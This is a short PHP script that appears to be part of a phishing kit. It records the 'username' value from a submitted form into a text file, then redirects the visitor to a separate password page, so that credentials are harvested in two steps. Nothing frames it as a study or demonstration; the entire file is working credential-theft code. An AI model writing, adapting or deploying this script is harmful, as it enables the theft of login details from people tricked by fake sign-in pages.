<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: password.html');
exit();
